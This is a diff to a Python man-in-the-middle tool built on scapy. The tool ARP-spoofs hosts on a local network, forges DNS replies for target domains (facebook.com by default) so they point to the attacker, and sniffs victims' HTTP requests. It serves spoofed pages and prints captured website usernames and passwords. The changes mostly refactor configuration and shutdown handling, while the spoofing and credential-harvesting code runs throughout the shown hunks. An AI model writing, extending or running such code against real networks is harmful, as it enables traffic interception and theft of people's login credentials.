@@ -6,7 +6,7 @@ logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 from nfqueue import *
 
-from signal import signal, pause, SIGINT, SIGTERM
+from signal import signal, pause, SIGINT, SIGKILL
 from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
 from subprocess import Popen, PIPE, STDOUT
 from multiprocessing import Process, Pipe
@@ -22,10 +22,6 @@ from sys import exit
 
 conf.verb = 0
 conf.checkIPaddr = 0
-
-SHOWDNS = False
-SHOWHTTP = False
-URLSKIP = ["ocsp", ".jpg", ".jpeg", ".gif", ".png", ".css", ".ico", ".js", ".svg"]
 
 WHITE = "\033[0m"       # MAIN
 GRAY = "\033[37m"       # EXTRA
@@ -69,22 +65,20 @@ class ARPSpoof(Thread):
 
 class URLInspect(Thread):
 
-    def __init__(self, iface, host, conn):
+    def __init__(self, iface, host, conn,
+                 skip=["ocsp", ".jpg", ".jpeg", ".gif", ".png", ".css", ".ico", ".js", ".svg"]):
 
         Thread.__init__(self)
         self.iface = iface
         self.host = host
         self.conn = conn
+        self.skip = skip
         self.past_url = None
 
     def run(self):
 
         sniff(store=0, filter="port 80 and host %s"
               % self.host, prn=self.parse, iface=self.iface)
-
-    def stop(self):
-
-        self.stop.set()
 
     def parse(self, pkt):
 
@@ -129,7 +123,8 @@ class URLInspect(Thread):
                     if len(url) > 80:
                         url = url[:77] + "..."
                     if not url == self.past_url:
-                        self.conn.send(["POST", [self.host, gethostbyname(url.split("/")[0]), url]])
+                        self.conn.send(["POST",
+                                       [self.host, gethostbyname(url.split("/")[0]), url]])
                         self.past_url = url
             except:
                 pass
@@ -137,11 +132,12 @@ class URLInspect(Thread):
             try:
                 if host and get:
                     url = host+get
-                    if not any(i in url for i in URLSKIP):
+                    if not any(i in url for i in self.skip):
                         if len(url) > 80:
                             url = url[:77] + "..."
                         if not url == self.past_url:
-                            self.conn.send(["GET", [self.host, gethostbyname(url.split("/")[0]), url]])
+                            self.conn.send(["GET",
+                                           [self.host, gethostbyname(url.split("/")[0]), url]])
                             self.past_url = url
             except:
                 pass
@@ -191,7 +187,7 @@ class HTTPHandler(BaseHTTPRequestHandler):
                 self.send_response(200)
                 self.send_header('Content-type', 'text/html')
                 self.end_headers()
-                html = "<meta http-equiv=\"refresh\" content=\"3; url=https://%s\" />" % self.dname
+                html = "<meta http-equiv=\"refresh\"content=\"3; url=https://%s\" />" % self.dname
                 self.wfile.write(html)
                 self.wfile.close()
 
@@ -199,6 +195,7 @@ class HTTPHandler(BaseHTTPRequestHandler):
                 pass
 
             self.conn.send(["STOP", None])
+            os.kill(getpid(), SIGKILL)
 
     def log_message(self, format, *args):
 
@@ -275,6 +272,7 @@ class DNSSpoof(Process):
                              DNS(id=dns.id, qr=1, aa=1, qd=dns.qd,
                                  an=DNSRR(rrname=dns.qd.qname, ttl=10, rdata=self.iface_ip)))
 
+                    sleep(1)
                     send(reply, count=2)
 
     def falsify(self, html):
@@ -493,25 +491,16 @@ def main():
 
     print(WHITE + "Initializing")
 
-    if args.http:
-        global SHOWHTTP
-        SHOWHTTP = True
-
-    if args.dns:
-        global SHOWDNS
-        SHOWDNS = True
-
     if args.iface:
         iface = args.iface
     else:
-        print(WHITE + "No interface specified, using default (%s)" % conf.iface)
+        print(WHITE + "No interface specified, using default [%s]" % conf.iface)
         iface = conf.iface
 
     if args.dnames:
-        global DOMAINS
-        DOMAINS = args.dnames.split()
+        dnames = args.dnames.split()
     else:
-        DOMAINS = ["facebook.com"]
+        dnames = ["facebook.com"]
         print(WHITE + "No domains specified, using default [facebook.com]")
 
     iface_ip = get_ip(iface)
@@ -568,7 +557,7 @@ def main():
             print(WHITE + "No hosts detected")
             exit(0)
 
-    dnsspoof_proc = DNSSpoof(iface_ip, hosts, DOMAINS, child_conn)
+    dnsspoof_proc = DNSSpoof(iface_ip, hosts, dnames, child_conn)
     dnsspoof_proc.start()
 
     while True:
@@ -580,6 +569,7 @@ def main():
                 print(WHITE + "Stopping")
                 set_forward(False)
                 set_nfq(False)
+                dnsspoof_proc.terminate()
 
                 for thrd in arpspoof_thrds:
                     print(GRAY + "Healing %s" % thrd.host)
@@ -594,23 +584,21 @@ def main():
             if recieved[0] == "ATT":
                 print(WHITE + "Attacking {:s} ({:s})".format(*recieved[1]))
 
-            if recieved[0] == "DNS" and SHOWDNS:
+            if recieved[0] == "DNS" and args.dns:
                 print(GRAY + "{:15s} DNSQ  {:15s} {:s}".format(*recieved[1]))
 
-            if recieved[0] == "GET" and SHOWHTTP:
+            if recieved[0] == "GET" and args.http:
                 print(GRAY + "{:15s} GET   {:15s} {:s}".format(*recieved[1]))
 
-            if recieved[0] == "POST" and SHOWHTTP:
+            if recieved[0] == "POST" and args.http:
                 print(GRAY + "{:15s} POST  {:15s} {:s}".format(*recieved[1]))
 
             if recieved[0] == "CRED":
-                print(RED + "Attack success, website:{:s} user:{:s} pass:{:s}".format(*recieved[1]))
+                print(RED + "Website:{:s}  Username:{:s}  Password:{:s}".format(*recieved[1]))
 
         sleep(0.2)
 
-    os.kill(dnsspoof_proc.pid, SIGTERM)
-    os.kill(getpid(), SIGTERM)
-    print(WHITE + "Stopped")
+    os.kill(getpid(), SIGKILL)
 
 if __name__ == '__main__':
     main()
